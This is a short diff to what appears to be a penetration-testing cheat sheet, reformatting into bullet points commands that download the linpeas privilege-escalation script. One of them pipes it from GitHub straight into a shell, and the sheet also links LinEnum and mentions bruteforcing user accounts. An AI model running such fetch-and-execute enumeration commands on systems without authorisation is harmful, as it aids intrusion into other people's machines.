@@ -26,9 +26,9 @@ To get a nice wordlist which will help you in bruteforcing for other user accoun
 
 ## linpeas
 
-```curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh```
+* ```curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh```
 
-```wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh```
+* ```wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh```
 
 ## linenum
 https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
